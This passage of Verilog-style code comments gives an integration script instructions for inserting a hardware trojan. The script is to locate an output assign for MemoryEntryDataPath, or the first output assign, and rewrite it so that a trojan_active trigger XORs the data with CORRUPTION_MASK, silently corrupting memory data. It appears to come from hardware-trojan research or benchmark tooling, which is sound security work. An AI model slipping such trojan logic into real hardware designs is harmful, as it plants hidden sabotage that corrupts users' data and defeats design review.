...
//
// IMPORTANT: MemoryEntryDataPath may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If MemoryEntryDataPath is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for MemoryEntryDataPath (or first output assign):
//     assign MemoryEntryDataPath = <expr>;
//   Replace with:
//     assign MemoryEntryDataPath = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
